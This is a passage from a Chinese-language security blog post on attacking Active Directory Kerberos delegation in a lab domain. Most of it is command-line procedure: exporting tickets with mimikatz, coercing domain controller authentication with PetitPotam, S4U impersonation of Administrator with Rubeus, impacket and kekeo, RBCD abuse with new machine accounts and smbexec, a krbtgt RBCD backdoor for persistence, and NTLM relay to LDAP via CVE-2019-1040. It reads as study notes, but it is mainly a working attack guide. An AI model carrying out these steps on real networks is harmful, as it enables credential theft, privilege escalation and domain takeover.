title=\"攻击利用\"></a>攻击利用</h2><p>如果目前拿下了serverA机器中的某些非约束委派账号权限，两种攻击利用思路：</p>\n<ol>\n<li>查看当前内存中有哪些票据，利用票据</li>\n<li>诱导或强迫目标机器（可以是域控）和该机器进行认证，从而导出内存中的目标机器TGT</li>\n</ol>\n<h3 id=\"利用现成票据\"><a href=\"#利用现成票据\" class=\"headerlink\" title=\"利用现成票据\"></a>利用现成票据</h3><p>如果以前有机器访问过非约束委派机器那么内存中肯定有现成的TGT，直接导出当前票据看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">klist</span><br><span class=\"line\"># 查看票据</span><br><span class=\"line\">mimikatz.exe &quot;kerberos::list&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 域内主机导出票据</span><br><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br><span class=\"line\"></span><br><span class=\"line\"># 导入内存</span><br><span class=\"line\">mimikatz.exe &quot;kerberos::ptt [0;cfd6c]-2-0-60a10000-Administrator@krbtgt-REDTEAM.LAB.kirbi&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 访问目标盘</span><br><span class=\"line\">dir \\\\DC2016.redteam.lab\\c$</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"强制身份认证\"><a href=\"#强制身份认证\" class=\"headerlink\" title=\"强制身份认证\"></a>强制身份认证</h3><p>可见《NTLM Relay-获取NTLM方式》通过以下几种 漏洞/特性/bug 强制目标主机对非约束委派账号进行身份认证，此时非约束委派机器内存中就有目标TGT</p>\n<ul>\n<li>PrinterBug</li>\n<li>PeitiPotam</li>\n<li>DFSCoerce</li>\n<li>ShadowCoerce</li>\n<li>PrivExchange</li>\n</ul>\n<p>委派机器监听TGT</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe monitor &#x2F;interval:3 &#x2F;targetuser:DC01$ &#x2F;nowrap</span><br></pre></td></tr></table></figure>\n\n<p>PetitPotam进行强制认证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-PetitPotam -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>\n\n<p>将Rubeus接收内容保存为票据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#39;doIFlDCCBZCg..&#39; | base64 -d &gt; DC.kirbi</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"攻击-约束委派\"><a href=\"#攻击-约束委派\" class=\"headerlink\" title=\"攻击-约束委派\"></a>攻击-约束委派</h1><p>根据约束委派流程，配置了约束委派的账号无法缓存目标的TGT，<strong>只能通过S4U协议获取某些特定的服务的ST</strong>，针对约束委派的攻击有以下思路：如果能拿到约束委派用户（或主机）的密码或者Hash，就可以伪造S4U请求：伪装成服务用户以 <strong>任意用户的权限</strong> 申请 <strong>指定服务的ST</strong></p>\n<p><strong>利用前提：</strong>设置了 <strong>仅信任此用户作为指定服务的委派 - 使用任何身份验证协议</strong> 这是因为委派攻击核心是要通过S4U2Self协议去伪造任意用户，如果设置了仅使用 Kerberos，则强制仅使用S4U2Proxy。</p>\n<blockquote>\n<p>比如查出来WIN7$有约束委派，委派的服务为域控的CIFS（Windows文件共享），当拿到WIN7的凭证后就可以伪造域管administrator去访问域控的文件系统</p>\n</blockquote>\n<p>deepseek总结的</p>\n<table>\n<thead>\n<tr>\n<th>攻击场景</th>\n<th>目标 SPN</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>WMI 远程执行</td>\n<td>HOST</td>\n</tr>\n<tr>\n<td>PowerShell/WinRM 远程</td>\n<td>HTTP</td>\n</tr>\n<tr>\n<td>DCSync</td>\n<td>LDAP</td>\n</tr>\n<tr>\n<td>文件共享访问</td>\n<td>CIFS</td>\n</tr>\n</tbody></table>\n<h2 id=\"环境模拟\"><a href=\"#环境模拟\" class=\"headerlink\" title=\"环境模拟\"></a>环境模拟</h2><p>为域内用户tom注册SPN使其成为服务账户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">setspn -Q test&#x2F;win7.test.com</span><br><span class=\"line\">setspn -S test&#x2F;win7.test.com test\\tom</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517122014241.png\" alt=\"image-20250517122014241\"></p>\n<p>随后配置约束委派，将其委派到域控的CIFS服务</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517164652612.png\" alt=\"image-20250517164652612\"></p>\n<p>通过impacket查询域内委派关系，不同的设置回显也不同，此时代表环境模拟成功</p>\n<p>仅使用Kerberos：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517122710952.png\" alt=\"image-20250517122710952\"></p>\n<p>使用任何身份验证协议：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517162011925.png\" alt=\"image-20250517162011925\"></p>\n<h2 id=\"约束委派查询\"><a href=\"#约束委派查询\" class=\"headerlink\" title=\"约束委派查询\"></a>约束委派查询</h2><p>powerview：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 导入 PowerView 脚本</span><br><span class=\"line\">import-module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询域内约束性委派的计算机</span><br><span class=\"line\">Get-DomainComputer -TrustedToAuth -Domain zjun.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto |fl</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询域内非约束性委派的服务账号</span><br><span class=\"line\">Get-DomainUser -TrustedToAuth -Domain zjun.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto |fl</span><br></pre></td></tr></table></figure>\n\n<p>ADFind：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查询域内约束性委派的计算机</span><br><span class=\"line\">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; msds-allowedtodelegateto</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询约束性委派的服务账号</span><br><span class=\"line\">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>\n\n<p>ldapsearch：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查询域内约束性委派的计算机</span><br><span class=\"line\">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 查询非束性委派的服务账号</span><br><span class=\"line\">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击利用-1\"><a href=\"#攻击利用-1\" class=\"headerlink\" title=\"攻击利用\"></a>攻击利用</h2><h3 id=\"有委派账号凭证\"><a href=\"#有委派账号凭证\" class=\"headerlink\" title=\"有委派账号凭证\"></a>有委派账号凭证</h3><p>如果直接有委派账号的凭证（明文密码、hash）可直接获取特定服务的ST。</p>\n<ul>\n<li>Rubeus：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 利用票据</span><br><span class=\"line\">Rubeus.exe asktgt &#x2F;user:WIN10-1$ &#x2F;rc4:8f91f8786d308e62c609688886dc7c4c &#x2F;domain:redteam.lab &#x2F;dc:DC2016.redteam.lab &#x2F;nowrap</span><br><span class=\"line\">Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;msdsspn:CIFS&#x2F;DC2016.redteam.lab &#x2F;dc:DC2016.redteam.lab &#x2F;ptt &#x2F;ticket:doIE7DCCB</span><br><span class=\"line\"></span><br><span class=\"line\"># 直接申请ST</span><br><span class=\"line\">Rubeus.exe s4u &#x2F;user:tom &#x2F;rc4:40863c69c2e2ef8ed9c233d9c7b95140 &#x2F;impersonateuser:Administrator &#x2F;msdsspn:CIFS&#x2F;DC-1.test.com &#x2F;domain:test.com &#x2F;dc:DC-1.test.com &#x2F;ptt &#x2F;nowrap</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517171902589.png\" alt=\"image-20250517171902589\"></p>\n<ul>\n<li>impacket：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 利用票据</span><br><span class=\"line\">impacket-getTGT -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br><span class=\"line\">impacket-getST -dc-ip 192.168.100.128 -spn CIFS&#x2F;DC-1.test.com -impersonate Administrator -k -no-pass test.com&#x2F;tom</span><br><span class=\"line\"></span><br><span class=\"line\"># 直接申请ST</span><br><span class=\"line\">impacket-getST -dc-ip 192.168.100.128 -spn CIFS&#x2F;DC-1.test.com -impersonate Administrator test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>\n\n<p><strong>使用任何身份验证协议</strong>，直接申请特定服务ST</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-getST -dc-ip 192.168.100.128 -spn CIFS&#x2F;DC-1.test.com -impersonate Administrator test.com&#x2F;tom:Ab123456</span><br><span class=\"line\">export KRB5CCNAME&#x3D;Administrator@CIFS_DC-1.test.com@TEST.COM.ccache</span><br><span class=\"line\">impacket-smbclient -k -no-pass Administrator@DC-1.test.com -dc-ip 192.168.100.128</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517124114941.png\" alt=\"image-20250517124114941\"></p>\n<p><strong>仅使用 Kerberos</strong>，就会报错 <code>KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517125252309.png\" alt=\"image-20250517125252309\"></p>\n<ul>\n<li>kekeo：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 本地申请服务账号TGT</span><br><span class=\"line\">kekeo.exe &quot;tgt::ask &#x2F;user:many &#x2F;domain:xiaorang.lab &#x2F;password:asd123! &#x2F;ticket:many.kirbi&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 申请特定服务ST</span><br><span class=\"line\">kekeo.exe &quot;tgs::s4u &#x2F;tgt:TGT_many@xiaorang.lab_krbtgt~haishi.com@xiaorang.lab.kirbi &#x2F;user:administrator@xiaorang.lab &#x2F;service:cifs&#x2F;DC.xiaorang.lab&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"本地导出委派账号票据\"><a href=\"#本地导出委派账号票据\" class=\"headerlink\" title=\"本地导出委派账号票据\"></a>本地导出委派账号票据</h3><p>如果没有委派账号的凭证，但是拿下了这台机器中有委派账号，直接提权抓凭证或者导出票据，剩下步骤同上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 导出票据</span><br><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"攻击-基于资源的约束性委派\"><a href=\"#攻击-基于资源的约束性委派\" class=\"headerlink\" title=\"攻击-基于资源的约束性委派\"></a>攻击-基于资源的约束性委派</h1><p>传统的约束委派是正向的, 需要以 SeEnableDelegation 权限将 Service A 的 <code>msDS-AllowedToDelegateTo</code> 属性指定为 Service B</p>\n<p>而基于资源的约束委派则是反向的，只需要在 Service B 上将 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指定为 Service A，从而指定只能ServiceA来访问自身服务</p>\n<p>配置 RBCD 的关键在于 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 通常以下用户能够修改此属性</p>\n<ul>\n<li>将主机加入域的用户 (机器账户中会有一个 msDS-CreatorSID 属性, 使用非域管账户加入域时才会显示)</li>\n<li>Account Operators (能修改任意域内非域控机器的委派属性)</li>\n<li>NT AUTHORITY\\SELF (该主机的机器账户)</li>\n</ul>\n<p>根据RBCD特性，能够模拟其他用户的权限访问自己，所以资源的约束委派只能对自己进行攻击，也就是说 <strong>提权操作</strong> 或 <strong>权限维持</strong></p>\n<blockquote>\n<p>RBCD的攻击都是围绕 msDS-AllowedToActOnBehalfOfOtherIdentity 来进行的，由于该属性只能有特定的用户/用户组修改，所以RBCD攻击核心问题是要控制这些用户，从而修改此属性指向一个具有SPN的账户（S4U2Self只适用于具有SPN的账户），常规利用是指向一个新创建的机器账号（机器账户默认注册RestrictedKrbHost/domain和HOST/domain这两个SPN），利用新机器账号伪造administrator身份访问目标服务达到本地提权目的</p>\n</blockquote>\n<h2 id=\"RBCD查询\"><a href=\"#RBCD查询\" class=\"headerlink\" title=\"RBCD查询\"></a>RBCD查询</h2><p>分两种情况：</p>\n<ul>\n<li>拿下了一个域账号，查询能修改哪些机器，实现横向/提权</li>\n<li>拿下了一台域内机器，反向查询哪些域账号有修改权限，拿下域账号后实现提权</li>\n</ul>\n<p>情况一</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查用户账户SID</span><br><span class=\"line\">whoami &#x2F;all</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用PowerView查经由该用户加入域内的机器账户(主机)</span><br><span class=\"line\">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class=\"line\">Import-Module .\\PowerView.ps1;</span><br><span class=\"line\">Get-DomainObjectAcl | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-3222783777-1006235836-3661351843-1108&quot;&#125; | select objectdn,activedirectoryrights</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518004213338.png\" alt=\"image-20250518004213338\"></p>\n<p>情况二</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查SID</span><br><span class=\"line\">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(objectClass&#x3D;computer)(cn&#x3D;%COMPUTERNAME%))&quot; cn ms-DS-CreatorSID</span><br><span class=\"line\"></span><br><span class=\"line\"># 根据SID查账号</span><br><span class=\"line\">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;objectSid:&#x3D;S-1-5-21-3222783777-1006235836-3661351843-1108&quot; samaccountname</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517235353832.png\" alt=\"image-20250517235353832\"></p>\n<p>综上能看到域账号tom能修改WIN7</p>\n<hr>\n<p>一个能查询域内用户与机器对应关系的工具：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">using System;</span><br><span class=\"line\">using System.Security.Principal;</span><br><span class=\"line\">using System.DirectoryServices;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace findCreator</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    class Program</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        static void Main(string[] args)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            DirectoryEntry ldap_conn &#x3D; new DirectoryEntry(&quot;LDAP:&#x2F;&#x2F;dc&#x3D;test,dc&#x3D;com&quot;);</span><br><span class=\"line\">            DirectorySearcher search &#x3D; new DirectorySearcher(ldap_conn);</span><br><span class=\"line\">            String query &#x3D; &quot;(&amp;(objectClass&#x3D;computer))&quot;; &#x2F;&#x2F; 查找计算机</span><br><span class=\"line\">            search.Filter &#x3D; query;</span><br><span class=\"line\"></span><br><span class=\"line\">            foreach (SearchResult r in search.FindAll())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                String mS_DS_CreatorSID &#x3D; &quot;&quot;;</span><br><span class=\"line\">                String computername &#x3D; &quot;&quot;;</span><br><span class=\"line\">                try</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    computername &#x3D; r.Properties[&quot;dNSHostName&quot;][0].ToString();</span><br><span class=\"line\">                    mS_DS_CreatorSID &#x3D; (new SecurityIdentifier((byte[])r.Properties[&quot;mS-DS-CreatorSID&quot;][0], 0)).ToString();</span><br><span class=\"line\">                    &#x2F;&#x2F; Console.WriteLine(&quot;&#123;0&#125; &#123;1&#125;\\n&quot;, computername, mS_DS_CreatorSID);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                catch</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    ;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                &#x2F;&#x2F; 再通过 SID 找用户名</span><br><span class=\"line\">                String UserQuery &#x3D; &quot;(&amp;(objectClass&#x3D;user))&quot;;</span><br><span class=\"line\">                DirectorySearcher search2 &#x3D; new DirectorySearcher(ldap_conn);</span><br><span class=\"line\">                search2.Filter &#x3D; UserQuery;</span><br><span class=\"line\"></span><br><span class=\"line\">                foreach (SearchResult u in search2.FindAll())</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    String user_sid &#x3D; (new SecurityIdentifier((byte[])u.Properties[&quot;objectSid&quot;][0], 0)).ToString();</span><br><span class=\"line\">                    if (user_sid &#x3D;&#x3D; mS_DS_CreatorSID)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        &#x2F;&#x2F; Console.WriteLine(&quot;debug&quot;);</span><br><span class=\"line\">                        String username &#x3D; u.Properties[&quot;name&quot;][0].ToString();</span><br><span class=\"line\">                        Console.WriteLine(&quot;[*] [&#123;0&#125;] -&gt; creator [&#123;1&#125;]&quot;, computername, username);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520010138219.png\" alt=\"image-20250520010138219\"></p>\n<h2 id=\"攻击利用-2\"><a href=\"#攻击利用-2\" class=\"headerlink\" title=\"攻击利用\"></a>攻击利用</h2><h3 id=\"常规利用\"><a href=\"#常规利用\" class=\"headerlink\" title=\"常规利用\"></a>常规利用</h3><p>思路：</p>\n<ul>\n<li><p>利用可控域用户创建一个机器账户 (每个域用户默认可以创建 10 个机器账户, 即 <code>msDS-MachineAccountQuota (MAQ)</code> 属性)</p>\n</li>\n<li><p>修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 使其指向新创建机器账户的 SID</p>\n</li>\n<li><p>利用该机器账户的凭证通过 S4U 协议申请委派至目标主机的 ST 票据, 实现本地提权/横向移动</p>\n</li>\n</ul>\n<p>首先利用域账号创建机器账户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-addcomputer -computer-name TEST\\$ -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>\n\n<p>配置  <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指向新机器账户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-rbcd -dc-ip 192.168.100.128 -action write -delegate-to WIN7\\$ -delegate-from TEST\\$ test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518005445422.png\" alt=\"image-20250518005445422\"></p>\n<p>S4U 协议伪造 Administrator 用户申请 ST</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-getST -dc-ip 192.168.100.128 -spn cifs&#x2F;WIN7.test.com -impersonate Administrator test.com&#x2F;test\\$:123456</span><br><span class=\"line\">export KRB5CCNAME&#x3D;Administrator@cifs_WIN7.test.com@TEST.COM.ccache</span><br><span class=\"line\">impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@WIN7.test.com</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>这里要把域控和目标添加到hosts中</p>\n<p>192.168.100.128 DC-1.test.com<br>192.168.100.130 WIN7.test.com</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518010827869.png\" alt=\"image-20250518010827869\"></p>\n<p><strong>RBCD属性清除</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 替换为目标计算机名称</span><br><span class=\"line\">$ComputerName &#x3D; &quot;WIN7&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 执行清除委派配置</span><br><span class=\"line\">Set-ADComputer $ComputerName -Clear &quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518020102797.png\" alt=\"image-20250518020102797\"></p>\n<h3 id=\"服务账户提权-Rotten-Tomato\"><a href=\"#服务账户提权-Rotten-Tomato\" class=\"headerlink\" title=\"服务账户提权(Rotten Tomato)\"></a>服务账户提权(Rotten Tomato)</h3><p>参考：<a href=\"https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw\">https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw</a></p>\n<p>除了上述将主机加入域的用户账户能够修改属性，还有一个是 NT AUTHORITY\\SELF（机器账户自身），<strong>在IIS、MSSQL、 Network Service 等服务账户出网时使用的是本机的机器账户，因此可以发起ldap请求以机器账户的身份修改自身的委派属性，从而提升至本地管理员权限</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/202308011607073.jpeg\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/1993669-20230110201520479-647285354.png\"></p>\n<blockquote>\n<p>如果能控制虚拟账户下的某个服务发起ldap请求或者通过relay2ldap是不是一种新提权方式呢 🤔</p>\n</blockquote>\n<p>例如拿下MSSQL后，利用 <a href=\"https://github.com/pkb1s/SharpAllowedToAct\">SharpAllowedToAct</a> 添加机器账户并配置委派属性</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Public\\SharpAllowedToAct.exe -m TEST -p 123456 -t MSSQL</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Domain &#x3D; test.com</span><br><span class=\"line\">[+] Domain Controller &#x3D; DC-1.test.com</span><br><span class=\"line\">[+] New SAMAccountName &#x3D; TEST$</span><br><span class=\"line\">[+] Distinguished Name &#x3D; CN&#x3D;TEST,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</span><br><span class=\"line\">[+] Machine account TEST added</span><br><span class=\"line\">[+] SID of New Computer: S-1-5-21-3222783777-1006235836-3661351843-1113</span><br><span class=\"line\">[+] Attribute changed successfully</span><br><span class=\"line\">[+] Done!</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520011417685.png\" alt=\"image-20250520011417685\"></p>\n<p>成功提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-getST -dc-ip 192.168.100.128 -spn cifs&#x2F;MSSQL.test.com -impersonate Administrator test.com&#x2F;test\\$:123456</span><br><span class=\"line\">export KRB5CCNAME&#x3D;Administrator@cifs_MSSQL.test.com@TEST.COM.ccache</span><br><span class=\"line\">impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@MSSQL.test.com</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520011847537.png\" alt=\"image-20250520011847537\"></p>\n<h3 id=\"RBCD后门\"><a href=\"#RBCD后门\" class=\"headerlink\" title=\"RBCD后门\"></a>RBCD后门</h3><p>用作域控的权限维持，拿下域控后，设置 krbtgt 服务的委派属性为指定后门账户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 添加机器账户</span><br><span class=\"line\">impacket-addcomputer -computer-name TEST\\$ -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br><span class=\"line\"></span><br><span class=\"line\"># 设置RBCD</span><br><span class=\"line\">powershell Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test$</span><br><span class=\"line\"></span><br><span class=\"line\"># PTT</span><br><span class=\"line\">impacket-getST -dc-ip 192.168.100.128 -spn krbtgt -impersonate Administrator test.com&#x2F;test\\$:123456</span><br><span class=\"line\">export KRB5CCNAME&#x3D;Administrator.ccache</span><br><span class=\"line\">impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@DC-1.test.com</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"NTLM-Relay-to-LDAP\"><a href=\"#NTLM-Relay-to-LDAP\" class=\"headerlink\" title=\"NTLM Relay to LDAP\"></a>NTLM Relay to LDAP</h3><p>通过不同协议relay2ldap完成RBCD的属性配置，实现RCE</p>\n<h4 id=\"SMB-CVE-2019-1040\"><a href=\"#SMB-CVE-2019-1040\" class=\"headerlink\" title=\"SMB(CVE-2019-1040)\"></a>SMB(CVE-2019-1040)</h4><p>默认情况下, LDAP 的签名策略为协商签名 (是否签名由客户端决定), 当使用 SMB 协议发起 LDAP 请求时, 就会要求 LDAP 服务器对 NTLM 认证请求强制签名, 所以一般来说无法通过 SMB 协议进行 NTLM Relay to LDAP，但是 2019 年爆出了 CVE-2019-1040 漏洞，它能够绕过 NTLM MIC 的防护机制，修改 NTLM 请求中的某些标志位，使得客户端对于 SMB 发起的 LDAP 请求不要求签名，从而实现 NTLM Relay</p>\n<p>通过 <strong>强制认证 + RBCD</strong> 可以实现普通域账号域内提权、横向移动</p>\n<blockquote>\n<p>如果是攻击域控的话需要有一个辅域环境，因为没法将主域控的ldap请求relay到自身，所以借助辅域控relay到主域控</p>\n</blockquote>\n<p>使用普通域账号添加机器账号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-addcomputer -computer-name TEST\\$ -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>\n\n<p>开启relay，注意设置 <code>--remove-mic</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;DC-1.test.com -smb2support --remove-mic --delegate-access --escalate-user &#39;TEST$&#39;</span><br></pre></td></tr></table></figure>\n\n<p>强制域控进行认证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-PetitPotam -d test.com -dc-ip &lt;dc-ip&gt; -u tom -p Ab123456 &lt;kali&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这一块的协议细节和攻击利用场景还有很多需要学习：</p>\n<p><a href=\"https://www.cnblogs.com/zpchcbd/p/17606864.html\">CVE-2019-1040配合打印机漏洞实现攻击Exchange进行资源委派攻击域控</a></p>\n<p><a href=\"https://www.cnblogs.com/zpchcbd/p/15857942.html\">CVE-2019-1040配合打印机漏洞实现攻击主域控进行资源委派攻击辅助域控</a></p>\n<p><a href=\"https://www.cnblogs.com/zpchcbd/p/17904328.html\">CVE-2019-1040 Drop The MIC漏洞</a></p>\n<h4 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h4><p>这里引入一个真实案例：<a href=\"https://mp.weixin.qq.com/s/8OueE-bEIdkvwPWu3KqrcQ\">这是一篇“不一样”的真实渗透测试案例分析文章</a>，介绍了利用WEBDAV XXE（JAVA）进行NTLM Relay从而搭配RBCD实现横向移动，其原理是：由于<code>sun.net.www.protocol.http.HttpURLConnection</code> 发送HTTP请求遇到状态码为401的HTTP返回头时，会判断该页面要求使用哪种认证方式，若攻击者回复要求采用NTLM认证则会自动使用当前用户凭据进行认证</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520044458393.png\" 